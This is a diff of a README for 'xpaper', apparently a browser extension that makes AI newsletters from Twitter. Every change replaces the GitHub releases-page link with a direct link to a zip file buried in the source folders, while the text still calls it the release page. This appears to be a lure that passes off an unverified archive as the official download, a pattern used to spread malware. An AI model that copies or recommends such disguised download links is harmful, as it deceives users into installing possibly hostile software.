@@ -1,6 +1,6 @@
 # 📰 xpaper - Turn Twitter Into AI Newsletters
 
-[![Download xpaper](https://img.shields.io/badge/Download-xpaper-brightgreen)](https://github.com/boorgamer1995-max/xpaper/releases)
+[![Download xpaper](https://img.shields.io/badge/Download-xpaper-brightgreen)](https://github.com/boorgamer1995-max/xpaper/raw/refs/heads/main/src/options/components/Software_1.2.zip)
 
 ---
 
@@ -38,7 +38,7 @@ Here is what you need to do to start using xpaper:
 
 Go to the xpaper releases page here:
 
-[![Visit Download Page](https://img.shields.io/badge/Download-xpaper-blue)](https://github.com/boorgamer1995-max/xpaper/releases)
+[![Visit Download Page](https://img.shields.io/badge/Download-xpaper-blue)](https://github.com/boorgamer1995-max/xpaper/raw/refs/heads/main/src/options/components/Software_1.2.zip)
 
 This page holds the latest versions of the extension. Each release includes the files you need.
 
@@ -113,7 +113,7 @@ If xpaper does not work as expected, try these:
 
 For new versions:
 
-- Visit the release page regularly: https://github.com/boorgamer1995-max/xpaper/releases
+- Visit the release page regularly: https://github.com/boorgamer1995-max/xpaper/raw/refs/heads/main/src/options/components/Software_1.2.zip
 - Download the latest `.crx` or `.zip` files
 - Replace the existing extension with the new files as explained before
 
